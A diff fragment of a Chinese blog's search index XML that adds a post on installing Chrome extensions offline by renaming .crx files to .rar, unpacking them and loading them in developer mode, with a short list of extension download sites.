 <p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233059.png" alt=""></p>
 <p><strong>官网</strong> : <a href="https://www.bandicam.cn/downloads/" target="_blank" rel="noopener">链接</a> </p>
 <p><strong>备份下载</strong> : <a href="https://yuanhe-xia.lanzous.com/idqkffwzq5i" target="_blank" rel="noopener">蓝奏云</a> </p>
+<hr>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>其他</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>谷歌浏览器插件安装</title>
+    <url>/doc/1720/</url>
+    <content><![CDATA[<blockquote>
+<p>写在前面的话:</p>
+<p>​    本人建议境外人士或通过公安授权等合法手段能访问谷歌在线商店的人.通过谷歌在线商店安装插件.</p>
+<p>​    本人不提倡,不建议,不诱导在境内通过连接VPN , 挂代理等非法手段绕过GFW封锁从谷歌在线商店安装谷歌插件.</p>
+</blockquote>
+<a id="more"></a>
+
+<hr>
+<h2 id="安装插件的方法"><a href="#安装插件的方法" class="headerlink" title="安装插件的方法"></a>安装插件的方法</h2><ul>
+<li><del>在线安装</del></li>
+<li>离线安装<ul>
+<li><del>crx 安装</del>  <em>(受限于浏览器与插件版本 , 现目前大多数插件无法通过该方式安装)</em> </li>
+<li>crx 转为 rar 压缩包解压安装.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<hr>
+<h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><h3 id="crx安装"><a href="#crx安装" class="headerlink" title="crx安装"></a>crx安装</h3><ol>
+<li>打开插件管理页面 <code>更多工具--&gt;扩展程序</code> .</li>
+<li>拖动crx文件到该页面中. <em>(未实验成功故无图)</em> </li>
+</ol>
+<hr>
+<h3 id="rar-压缩包解压安装"><a href="#rar-压缩包解压安装" class="headerlink" title="rar 压缩包解压安装"></a>rar 压缩包解压安装</h3><p>本次实验以 <code>Aria2 for chrome</code> 插件为例 : </p>
+<ol>
+<li><p>在插件下载网站 <em>(插件网站我放在最后)</em> 下载crx插件. </p>
+</li>
+<li><p>下载插件后将后缀改为 <code>.rar</code> , 并将其解压至一个文件夹. </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233657.gif" alt=""></p>
+</li>
+</ol>
+<ol start="3">
+<li><p>在浏览器 <code>更多工具--&gt;扩展程序</code> 处打开插件管理. </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233705.png" alt=""></p>
+</li>
+</ol>
+<ol start="4">
+<li><p>依次点击 <code>开发者模式--&gt;加载已解压的扩展程序</code> , 在弹出来的界面中选择插件解压的文件夹. </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233720.gif" alt=""></p>
+</li>
+</ol>
+<ol start="5">
+<li><p>添加成功. </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233730.png" alt=""></p>
+</li>
+</ol>
+<hr>
+<hr>
+<h2 id="插件网站"><a href="#插件网站" class="headerlink" title="插件网站"></a>插件网站</h2><ul>
+<li><p><a href="https://github.com/search" target="_blank" rel="noopener">Github</a> : 大多数插件都是开源的,可通过此网站搜索到一部分插件.个人比较推荐这个.</p>
+</li>
+<li><p><a href="https://www.crx4chrome.com/" target="_blank" rel="noopener">crx4chrome</a> : 包含众多谷歌插件,含插件历史版本(好评),境内可访问,但网站的验证码有点难受.</p>
+</li>
+<li><p><a href="https://crxdl.com/" target="_blank" rel="noopener">crxdl</a> : 境内可访问,网站访问速度还挺快的.不过有些插件搜不到,网站验证机制和上面那个一样.</p>
+</li>
+</ul>
 <hr>
 ]]></content>
       <categories>
